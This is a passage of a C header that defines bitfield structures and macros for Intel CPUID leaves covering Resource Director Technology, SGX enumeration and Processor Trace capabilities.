#define CPUID_EDX_SUPPORTS_L3_OCCUPANCY_MONITORING(_)                (((_) >> 0) & 0x01)

            /**
             * [Bit 1] Supports L3 Total Bandwidth monitoring if 1.
             */
            UINT32 SupportsL3TotalBandwidthMonitoring : 1;
#define CPUID_EDX_SUPPORTS_L3_TOTAL_BANDWIDTH_MONITORING_BIT         1
#define CPUID_EDX_SUPPORTS_L3_TOTAL_BANDWIDTH_MONITORING_FLAG        0x02
#define CPUID_EDX_SUPPORTS_L3_TOTAL_BANDWIDTH_MONITORING_MASK        0x01
#define CPUID_EDX_SUPPORTS_L3_TOTAL_BANDWIDTH_MONITORING(_)          (((_) >> 1) & 0x01)

            /**
             * [Bit 2] Supports L3 Local Bandwidth monitoring if 1.
             */
            UINT32 SupportsL3LocalBandwidthMonitoring : 1;
#define CPUID_EDX_SUPPORTS_L3_LOCAL_BANDWIDTH_MONITORING_BIT         2
#define CPUID_EDX_SUPPORTS_L3_LOCAL_BANDWIDTH_MONITORING_FLAG        0x04
#define CPUID_EDX_SUPPORTS_L3_LOCAL_BANDWIDTH_MONITORING_MASK        0x01
#define CPUID_EDX_SUPPORTS_L3_LOCAL_BANDWIDTH_MONITORING(_)          (((_) >> 2) & 0x01)
            UINT32 Reserved1 : 29;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_0F_ECX_01;

/**
 * @}
 */

 /**
  * @defgroup CPUID_EAX_10 \
  *           EAX = 0x10
  *
  * When CPUID executes with EAX set to 10H and ECX = 0, the processor returns information about the bit-vector
  * representation of QoS Enforcement resource types that are supported in the processor. Each bit, starting from bit 1,
  * corresponds to a specific resource type if the bit is set. The bit position corresponds to the sub-leaf index (or ResID)
  * that software must use to query QoS enforcement capability available for that type.
  * When CPUID executes with EAX set to 10H and ECX = n (n >= 1, and is a valid ResID), the processor returns information
  * about available classes of service and range of QoS mask MSRs that software can use to configure each class of services
  * using capability bit masks in the QoS Mask registers, IA32_resourceType_Mask_n.
  * @{
  */
#define CPUID_INTEL_RESOURCE_DIRECTOR_TECHNOLOGY_ALLOCATION_INFORMATION 0x00000010
  /**
   * @brief Intel Resource Director Technology (Intel RDT) Allocation Enumeration Sub-leaf (EAX = 10H, ECX = 0)
   *
   * @note Leaf 10H output depends on the initial value in ECX. Sub-leaf index 0 reports valid resource identification
   *       (ResID) starting at bit position 1 of EBX.
   */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Value of bits [31:0] of IA32_PLATFORM_DCA_CAP MSR (address 1F8H).
             */
            UINT32 Ia32PlatformDcaCap : 32;
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_BIT                          0
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_FLAG                         0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_MASK                         0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP(_)                           (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            UINT32 Reserved1 : 1;

            /**
             * [Bit 1] Supports L3 Cache Allocation Technology if 1.
             */
            UINT32 SupportsL3CacheAllocationTechnology : 1;
#define CPUID_EBX_SUPPORTS_L3_CACHE_ALLOCATION_TECHNOLOGY_BIT        1
#define CPUID_EBX_SUPPORTS_L3_CACHE_ALLOCATION_TECHNOLOGY_FLAG       0x02
#define CPUID_EBX_SUPPORTS_L3_CACHE_ALLOCATION_TECHNOLOGY_MASK       0x01
#define CPUID_EBX_SUPPORTS_L3_CACHE_ALLOCATION_TECHNOLOGY(_)         (((_) >> 1) & 0x01)

            /**
             * [Bit 2] Supports L2 Cache Allocation Technology if 1.
             */
            UINT32 SupportsL2CacheAllocationTechnology : 1;
#define CPUID_EBX_SUPPORTS_L2_CACHE_ALLOCATION_TECHNOLOGY_BIT        2
#define CPUID_EBX_SUPPORTS_L2_CACHE_ALLOCATION_TECHNOLOGY_FLAG       0x04
#define CPUID_EBX_SUPPORTS_L2_CACHE_ALLOCATION_TECHNOLOGY_MASK       0x01
#define CPUID_EBX_SUPPORTS_L2_CACHE_ALLOCATION_TECHNOLOGY(_)         (((_) >> 2) & 0x01)

            /**
             * [Bit 3] Supports Memory Bandwidth Allocation if 1.
             */
            UINT32 SupportsMemoryBandwidthAllocation : 1;
#define CPUID_EBX_SUPPORTS_MEMORY_BANDWIDTH_ALLOCATION_BIT           3
#define CPUID_EBX_SUPPORTS_MEMORY_BANDWIDTH_ALLOCATION_FLAG          0x08
#define CPUID_EBX_SUPPORTS_MEMORY_BANDWIDTH_ALLOCATION_MASK          0x01
#define CPUID_EBX_SUPPORTS_MEMORY_BANDWIDTH_ALLOCATION(_)            (((_) >> 3) & 0x01)
            UINT32 Reserved2 : 28;
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_10_ECX_00;

/**
 * @brief L3 Cache Allocation Technology Enumeration Sub-leaf (EAX = 10H, ECX = ResID = 1)
 *
 * @note Leaf 10H output depends on the initial value in ECX.
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 4:0] Length of the capacity bit mask for the corresponding ResID using minus-one notation.
             */
            UINT32 LengthOfCapacityBitMask : 5;
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_BIT                    0
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_FLAG                   0x1F
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_MASK                   0x1F
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK(_)                     (((_) >> 0) & 0x1F)
            UINT32 Reserved1 : 27;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Bit-granular map of isolation/contention of allocation units.
             */
            UINT32 Ebx0 : 32;
#define CPUID_EBX_EBX_0_BIT                                          0
#define CPUID_EBX_EBX_0_FLAG                                         0xFFFFFFFF
#define CPUID_EBX_EBX_0_MASK                                         0xFFFFFFFF
#define CPUID_EBX_EBX_0(_)                                           (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            UINT32 Reserved1 : 2;

            /**
             * [Bit 2] Code and Data Prioritization Technology supported if 1.
             */
            UINT32 CodeAndDataPriorizationTechnologySupported : 1;
#define CPUID_ECX_CODE_AND_DATA_PRIORIZATION_TECHNOLOGY_SUPPORTED_BIT 2
#define CPUID_ECX_CODE_AND_DATA_PRIORIZATION_TECHNOLOGY_SUPPORTED_FLAG 0x04
#define CPUID_ECX_CODE_AND_DATA_PRIORIZATION_TECHNOLOGY_SUPPORTED_MASK 0x01
#define CPUID_ECX_CODE_AND_DATA_PRIORIZATION_TECHNOLOGY_SUPPORTED(_) (((_) >> 2) & 0x01)
            UINT32 Reserved2 : 29;
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 15:0] Highest COS number supported for this ResID.
             */
            UINT32 HighestCosNumberSupported : 16;
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_BIT                   0
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_FLAG                  0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_MASK                  0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED(_)                    (((_) >> 0) & 0xFFFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_10_ECX_01;

/**
 * @brief L2 Cache Allocation Technology Enumeration Sub-leaf (EAX = 10H, ECX = ResID = 2)
 *
 * @note Leaf 10H output depends on the initial value in ECX.
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 4:0] Length of the capacity bit mask for the corresponding ResID using minus-one notation.
             */
            UINT32 LengthOfCapacityBitMask : 5;
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_BIT                    0
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_FLAG                   0x1F
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_MASK                   0x1F
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK(_)                     (((_) >> 0) & 0x1F)
            UINT32 Reserved1 : 27;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Bit-granular map of isolation/contention of allocation units.
             */
            UINT32 Ebx0 : 32;
#define CPUID_EBX_EBX_0_BIT                                          0
#define CPUID_EBX_EBX_0_FLAG                                         0xFFFFFFFF
#define CPUID_EBX_EBX_0_MASK                                         0xFFFFFFFF
#define CPUID_EBX_EBX_0(_)                                           (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 15:0] Highest COS number supported for this ResID.
             */
            UINT32 HighestCosNumberSupported : 16;
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_BIT                   0
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_FLAG                  0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_MASK                  0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED(_)                    (((_) >> 0) & 0xFFFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_10_ECX_02;

/**
 * @brief Memory Bandwidth Allocation Enumeration Sub-leaf (EAX = 10H, ECX = ResID = 3)
 *
 * @note Leaf 10H output depends on the initial value in ECX.
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 11:0] Reports the maximum MBA throttling value supported for the corresponding ResID using minus-one notation.
             */
            UINT32 MaxMbaThrottlingValue : 12;
#define CPUID_EAX_MAX_MBA_THROTTLING_VALUE_BIT                       0
#define CPUID_EAX_MAX_MBA_THROTTLING_VALUE_FLAG                      0xFFF
#define CPUID_EAX_MAX_MBA_THROTTLING_VALUE_MASK                      0xFFF
#define CPUID_EAX_MAX_MBA_THROTTLING_VALUE(_)                        (((_) >> 0) & 0xFFF)
            UINT32 Reserved1 : 20;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EBX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT                                       0
#define CPUID_EBX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            UINT32 Reserved1 : 2;

            /**
             * [Bit 2] Reports whether the response of the delay values is linear.
             */
            UINT32 ResponseOfDelayIsLinear : 1;
#define CPUID_ECX_RESPONSE_OF_DELAY_IS_LINEAR_BIT                    2
#define CPUID_ECX_RESPONSE_OF_DELAY_IS_LINEAR_FLAG                   0x04
#define CPUID_ECX_RESPONSE_OF_DELAY_IS_LINEAR_MASK                   0x01
#define CPUID_ECX_RESPONSE_OF_DELAY_IS_LINEAR(_)                     (((_) >> 2) & 0x01)
            UINT32 Reserved2 : 29;
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 15:0] Highest COS number supported for this ResID.
             */
            UINT32 HighestCosNumberSupported : 16;
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_BIT                   0
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_FLAG                  0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_MASK                  0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED(_)                    (((_) >> 0) & 0xFFFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_10_ECX_03;

/**
 * @}
 */

 /**
  * @defgroup CPUID_EAX_12 \
  *           EAX = 0x12
  *
  * When CPUID executes with EAX set to 12H and ECX = 0H, the processor returns information about Intel SGX capabilities.
  * When CPUID executes with EAX set to 12H and ECX = 1H, the processor returns information about Intel SGX attributes.
  * When CPUID executes with EAX set to 12H and ECX = n (n > 1), the processor returns information about Intel SGX Enclave
  * Page Cache.
  * @{
  */
#define CPUID_INTEL_SGX                                              0x00000012
  /**
   * @brief Intel SGX Capability Enumeration Leaf, sub-leaf 0 (EAX = 12H, ECX = 0)
   *
   * @note Leaf 12H sub-leaf 0 (ECX = 0) is supported if CPUID.(EAX=07H, ECX=0H):EBX[SGX] = 1.
   */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bit 0] If 1, Indicates Intel SGX supports the collection of SGX1 leaf functions.
             */
            UINT32 Sgx1 : 1;
#define CPUID_EAX_SGX1_BIT                                           0
#define CPUID_EAX_SGX1_FLAG                                          0x01
#define CPUID_EAX_SGX1_MASK                                          0x01
#define CPUID_EAX_SGX1(_)                                            (((_) >> 0) & 0x01)

            /**
             * [Bit 1] If 1, Indicates Intel SGX supports the collection of SGX2 leaf functions.
             */
            UINT32 Sgx2 : 1;
#define CPUID_EAX_SGX2_BIT                                           1
#define CPUID_EAX_SGX2_FLAG                                          0x02
#define CPUID_EAX_SGX2_MASK                                          0x01
#define CPUID_EAX_SGX2(_)                                            (((_) >> 1) & 0x01)
            UINT32 Reserved1 : 3;

            /**
             * [Bit 5] If 1, indicates Intel SGX supports ENCLV instruction leaves EINCVIRTCHILD, EDECVIRTCHILD, and ESETCONTEXT.
             */
            UINT32 SgxEnclvAdvanced : 1;
#define CPUID_EAX_SGX_ENCLV_ADVANCED_BIT                             5
#define CPUID_EAX_SGX_ENCLV_ADVANCED_FLAG                            0x20
#define CPUID_EAX_SGX_ENCLV_ADVANCED_MASK                            0x01
#define CPUID_EAX_SGX_ENCLV_ADVANCED(_)                              (((_) >> 5) & 0x01)

            /**
             * [Bit 6] If 1, indicates Intel SGX supports ENCLS instruction leaves ETRACKC, ERDINFO, ELDBC, and ELDUC.
             */
            UINT32 SgxEnclsAdvanced : 1;
#define CPUID_EAX_SGX_ENCLS_ADVANCED_BIT                             6
#define CPUID_EAX_SGX_ENCLS_ADVANCED_FLAG                            0x40
#define CPUID_EAX_SGX_ENCLS_ADVANCED_MASK                            0x01
#define CPUID_EAX_SGX_ENCLS_ADVANCED(_)                              (((_) >> 6) & 0x01)
            UINT32 Reserved2 : 25;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Bit vector of supported extended SGX features.
             */
            UINT32 Miscselect : 32;
#define CPUID_EBX_MISCSELECT_BIT                                     0
#define CPUID_EBX_MISCSELECT_FLAG                                    0xFFFFFFFF
#define CPUID_EBX_MISCSELECT_MASK                                    0xFFFFFFFF
#define CPUID_EBX_MISCSELECT(_)                                      (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 7:0] The maximum supported enclave size in non-64-bit mode is 2^(EDX[7:0]).
             */
            UINT32 MaxEnclaveSizeNot64 : 8;
#define CPUID_EDX_MAX_ENCLAVE_SIZE_NOT64_BIT                         0
#define CPUID_EDX_MAX_ENCLAVE_SIZE_NOT64_FLAG                        0xFF
#define CPUID_EDX_MAX_ENCLAVE_SIZE_NOT64_MASK                        0xFF
#define CPUID_EDX_MAX_ENCLAVE_SIZE_NOT64(_)                          (((_) >> 0) & 0xFF)

            /**
             * [Bits 15:8] The maximum supported enclave size in 64-bit mode is 2^(EDX[15:8]).
             */
            UINT32 MaxEnclaveSize64 : 8;
#define CPUID_EDX_MAX_ENCLAVE_SIZE_64_BIT                            8
#define CPUID_EDX_MAX_ENCLAVE_SIZE_64_FLAG                           0xFF00
#define CPUID_EDX_MAX_ENCLAVE_SIZE_64_MASK                           0xFF
#define CPUID_EDX_MAX_ENCLAVE_SIZE_64(_)                             (((_) >> 8) & 0xFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_12_ECX_00;

/**
 * @brief Intel SGX Attributes Enumeration Leaf, sub-leaf 1 (EAX = 12H, ECX = 1)
 *
 * @note Leaf 12H sub-leaf 1 (ECX = 1) is supported if CPUID.(EAX=07H, ECX=0H):EBX[SGX] = 1.
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reports the valid bits of SECS.ATTRIBUTES[31:0] that software can set with ECREATE.
             */
            UINT32 ValidSecsAttributes0 : 32;
#define CPUID_EAX_VALID_SECS_ATTRIBUTES_0_BIT                        0
#define CPUID_EAX_VALID_SECS_ATTRIBUTES_0_FLAG                       0xFFFFFFFF
#define CPUID_EAX_VALID_SECS_ATTRIBUTES_0_MASK                       0xFFFFFFFF
#define CPUID_EAX_VALID_SECS_ATTRIBUTES_0(_)                         (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reports the valid bits of SECS.ATTRIBUTES[63:32] that software can set with ECREATE.
             */
            UINT32 ValidSecsAttributes1 : 32;
#define CPUID_EBX_VALID_SECS_ATTRIBUTES_1_BIT                        0
#define CPUID_EBX_VALID_SECS_ATTRIBUTES_1_FLAG                       0xFFFFFFFF
#define CPUID_EBX_VALID_SECS_ATTRIBUTES_1_MASK                       0xFFFFFFFF
#define CPUID_EBX_VALID_SECS_ATTRIBUTES_1(_)                         (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reports the valid bits of SECS.ATTRIBUTES[95:64] that software can set with ECREATE.
             */
            UINT32 ValidSecsAttributes2 : 32;
#define CPUID_ECX_VALID_SECS_ATTRIBUTES_2_BIT                        0
#define CPUID_ECX_VALID_SECS_ATTRIBUTES_2_FLAG                       0xFFFFFFFF
#define CPUID_ECX_VALID_SECS_ATTRIBUTES_2_MASK                       0xFFFFFFFF
#define CPUID_ECX_VALID_SECS_ATTRIBUTES_2(_)                         (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reports the valid bits of SECS.ATTRIBUTES[127:96] that software can set with ECREATE.
             */
            UINT32 ValidSecsAttributes3 : 32;
#define CPUID_EDX_VALID_SECS_ATTRIBUTES_3_BIT                        0
#define CPUID_EDX_VALID_SECS_ATTRIBUTES_3_FLAG                       0xFFFFFFFF
#define CPUID_EDX_VALID_SECS_ATTRIBUTES_3_MASK                       0xFFFFFFFF
#define CPUID_EDX_VALID_SECS_ATTRIBUTES_3(_)                         (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_12_ECX_01;

/**
 * @brief Intel SGX EPC Enumeration Leaf, sub-leaves (EAX = 12H, ECX = 2 or higher)
 *
 * @note Leaf 12H sub-leaf 2 or higher (ECX >= 2) is supported if CPUID.(EAX=07H, ECX=0H):EBX[SGX] = 1.
 *       This structure describes sub-leaf type 0.
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 3:0] Sub-leaf Type 0. Indicates this sub-leaf is invalid.
             */
            UINT32 SubLeafType : 4;
#define CPUID_EAX_SUB_LEAF_TYPE_BIT                                  0
#define CPUID_EAX_SUB_LEAF_TYPE_FLAG                                 0x0F
#define CPUID_EAX_SUB_LEAF_TYPE_MASK                                 0x0F
#define CPUID_EAX_SUB_LEAF_TYPE(_)                                   (((_) >> 0) & 0x0F)
            UINT32 Reserved1 : 28;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EBX is zero.
             */
            UINT32 Zero : 32;
#define CPUID_EBX_ZERO_BIT                                           0
#define CPUID_EBX_ZERO_FLAG                                          0xFFFFFFFF
#define CPUID_EBX_ZERO_MASK                                          0xFFFFFFFF
#define CPUID_EBX_ZERO(_)                                            (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is zero.
             */
            UINT32 Zero : 32;
#define CPUID_ECX_ZERO_BIT                                           0
#define CPUID_ECX_ZERO_FLAG                                          0xFFFFFFFF
#define CPUID_ECX_ZERO_MASK                                          0xFFFFFFFF
#define CPUID_ECX_ZERO(_)                                            (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is zero.
             */
            UINT32 Zero : 32;
#define CPUID_EDX_ZERO_BIT                                           0
#define CPUID_EDX_ZERO_FLAG                                          0xFFFFFFFF
#define CPUID_EDX_ZERO_MASK                                          0xFFFFFFFF
#define CPUID_EDX_ZERO(_)                                            (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_12_ECX_02P_SLT_0;

/**
 * @brief Intel SGX EPC Enumeration Leaf, sub-leaves (EAX = 12H, ECX = 2 or higher)
 *
 * @note Leaf 12H sub-leaf 2 or higher (ECX >= 2) is supported if CPUID.(EAX=07H, ECX=0H):EBX[SGX] = 1.
 *       This structure describes sub-leaf type 1.
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 3:0] Sub-leaf Type 1. This sub-leaf enumerates an EPC section. EBX:EAX and EDX:ECX provide information on the
             * Enclave Page Cache (EPC) section.
             */
            UINT32 SubLeafType : 4;
#define CPUID_EAX_SUB_LEAF_TYPE_BIT                                  0
#define CPUID_EAX_SUB_LEAF_TYPE_FLAG                                 0x0F
#define CPUID_EAX_SUB_LEAF_TYPE_MASK                                 0x0F
#define CPUID_EAX_SUB_LEAF_TYPE(_)                                   (((_) >> 0) & 0x0F)
            UINT32 Reserved1 : 8;

            /**
             * [Bits 31:12] Bits 31:12 of the physical address of the base of the EPC section.
             */
            UINT32 EpcBasePhysicalAddress1 : 20;
#define CPUID_EAX_EPC_BASE_PHYSICAL_ADDRESS_1_BIT                    12
#define CPUID_EAX_EPC_BASE_PHYSICAL_ADDRESS_1_FLAG                   0xFFFFF000
#define CPUID_EAX_EPC_BASE_PHYSICAL_ADDRESS_1_MASK                   0xFFFFF
#define CPUID_EAX_EPC_BASE_PHYSICAL_ADDRESS_1(_)                     (((_) >> 12) & 0xFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 19:0] Bits 51:32 of the physical address of the base of the EPC section.
             */
            UINT32 EpcBasePhysicalAddress2 : 20;
#define CPUID_EBX_EPC_BASE_PHYSICAL_ADDRESS_2_BIT                    0
#define CPUID_EBX_EPC_BASE_PHYSICAL_ADDRESS_2_FLAG                   0xFFFFF
#define CPUID_EBX_EPC_BASE_PHYSICAL_ADDRESS_2_MASK                   0xFFFFF
#define CPUID_EBX_EPC_BASE_PHYSICAL_ADDRESS_2(_)                     (((_) >> 0) & 0xFFFFF)
            UINT32 Reserved1 : 12;
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 3:0] EPC section property encoding defined as follows:
             * - If EAX[3:0] 0000b, then all bits of the EDX:ECX pair are enumerated as 0.
             * - If EAX[3:0] 0001b, then this section has confidentiality and integrity protection.
             * All other encodings are reserved.
             */
            UINT32 EpcSectionProperty : 4;
#define CPUID_ECX_EPC_SECTION_PROPERTY_BIT                           0
#define CPUID_ECX_EPC_SECTION_PROPERTY_FLAG                          0x0F
#define CPUID_ECX_EPC_SECTION_PROPERTY_MASK                          0x0F
#define CPUID_ECX_EPC_SECTION_PROPERTY(_)                            (((_) >> 0) & 0x0F)
            UINT32 Reserved1 : 8;

            /**
             * [Bits 31:12] Bits 31:12 of the size of the corresponding EPC section within the Processor Reserved Memory.
             */
            UINT32 EpcSize1 : 20;
#define CPUID_ECX_EPC_SIZE_1_BIT                                     12
#define CPUID_ECX_EPC_SIZE_1_FLAG                                    0xFFFFF000
#define CPUID_ECX_EPC_SIZE_1_MASK                                    0xFFFFF
#define CPUID_ECX_EPC_SIZE_1(_)                                      (((_) >> 12) & 0xFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 19:0] Bits 51:32 of the size of the corresponding EPC section within the Processor Reserved Memory.
             */
            UINT32 EpcSize2 : 20;
#define CPUID_EDX_EPC_SIZE_2_BIT                                     0
#define CPUID_EDX_EPC_SIZE_2_FLAG                                    0xFFFFF
#define CPUID_EDX_EPC_SIZE_2_MASK                                    0xFFFFF
#define CPUID_EDX_EPC_SIZE_2(_)                                      (((_) >> 0) & 0xFFFFF)
            UINT32 Reserved1 : 12;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_12_ECX_02P_SLT_1;

/**
 * @}
 */

 /**
  * @defgroup CPUID_EAX_14 \
  *           EAX = 0x14
  *
  * When CPUID executes with EAX set to 14H and ECX = 0H, the processor returns information about Intel Processor Trace
  * extensions.
  * When CPUID executes with EAX set to 14H and ECX = n (n > 0 and less than the number of non-zero bits in CPUID.(EAX=14H,
  * ECX= 0H).EAX), the processor returns information about packet generation in Intel Processor Trace.
  * @{
  */
#define CPUID_INTEL_PROCESSOR_TRACE_INFORMATION                      0x00000014
  /**
   * @brief Intel Processor Trace Enumeration Main Leaf (EAX = 14H, ECX = 0)
   *
   * @note Leaf 14H main leaf (ECX = 0).
   */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reports the maximum sub-leaf supported in leaf 14H.
             */
            UINT32 MaxSubLeaf : 32;
#define CPUID_EAX_MAX_SUB_LEAF_BIT                                   0
#define CPUID_EAX_MAX_SUB_LEAF_FLAG                                  0xFFFFFFFF
#define CPUID_EAX_MAX_SUB_LEAF_MASK                                  0xFFFFFFFF
#define CPUID_EAX_MAX_SUB_LEAF(_)                                    (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bit 0] If 1, indicates that IA32_RTIT_CTL.CR3Filter can be set to 1, and that IA32_RTIT_CR3_MATCH MSR can be accessed.
             */
            UINT32 Flag0 : 1;
#define CPUID_EBX_FLAG0_BIT                                          0
#define CPUID_EBX_FLAG0_FLAG                                         0x01
#define CPUID_EBX_FLAG0_MASK                                         0x01
#define CPUID_EBX_FLAG0(_)                                           (((_) >> 0) & 0x01)

            /**
             * [Bit 1] If 1, indicates support of Configurable PSB and Cycle-Accurate Mode.
             */
            UINT32 Flag1 : 1;
#define CPUID_EBX_FLAG1_BIT                                          1
#define CPUID_EBX_FLAG1_FLAG                                         0x02
#define CPUID_EBX_FLAG1_MASK                                         0x01
#define CPUID_EBX_FLAG1(_)                                           (((_) >> 1) & 0x01)

            /**
             * [Bit 2] If 1, indicates support of IP Filtering, TraceStop filtering, and preservation of Intel PT MSRs across warm
             * reset.
             */
            UINT32 Flag2 : 1;
#define CPUID_EBX_FLAG2_BIT                                          2
#define CPUID_EBX_FLAG2_FLAG                                         0x04
#define CPUID_EBX_FLAG2_MASK                                         0x01
#define CPUID_EBX_FLAG2(_)                                           (((_) >> 2) & 0x01)

            /**
             * [Bit 3] If 1, indicates support of MTC timing packet and suppression of COFI-based packets.
             */
            UINT32 Flag3 : 1;
#define CPUID_EBX_FLAG3_BIT                                          3
#define CPUID_EBX_FLAG3_FLAG                                         0x08
#define CPUID_EBX_FLAG3_MASK                                         0x01
#define CPUID_EBX_FLAG3(_)                                           (((_) >> 3) & 0x01)

            /**
             * [Bit 4] If 1, indicates support of PTWRITE. Writes can set IA32_RTIT_CTL[12] (PTWEn) and IA32_RTIT_CTL[5] (FUPonPTW),
             * and PTWRITE can generate packets.
             */
            UINT32 Flag4 : 1;
#define CPUID_EBX_FLAG4_BIT                                          4
#define CPUID_EBX_FLAG4_FLAG                                         0x10
#define CPUID_EBX_FLAG4_MASK                                         0x01
#define CPUID_EBX_FLAG4(_)                                           (((_) >> 4) & 0x01)

            /**
             * [Bit 5] If 1, indicates support of Power Event Trace. Writes can set IA32_RTIT_CTL[4] (PwrEvtEn), enabling Power Event
